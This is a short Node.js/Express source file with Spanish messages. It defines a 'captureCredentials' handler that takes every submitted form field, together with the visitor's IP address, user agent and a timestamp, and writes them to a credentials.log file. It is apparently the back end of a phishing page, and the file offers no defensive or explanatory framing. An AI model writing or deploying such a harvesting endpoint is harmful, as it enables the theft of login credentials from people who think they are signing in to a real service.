import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

export const captureCredentials = async (req, res) => {
  try {
    const fields = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const agent = req.get('User-Agent');
    const timestamp = new Date().toISOString();

    const log = `Capturado: ${JSON.stringify(fields)} | IP: ${ip} | UA: ${agent} | Fecha: ${timestamp}\n`;

    const logPath = path.resolve(__dirname, "../../logs/credentials.log");

    fs.appendFileSync(logPath, log); // Síncrono y seguro

    return res.status(200).json({ message: 'Capturado' });
  } catch (err) {
    console.error('Error al capturar:', err);
    return res.status(500).json({ message: 'Error al capturar credenciales' });
  }
};
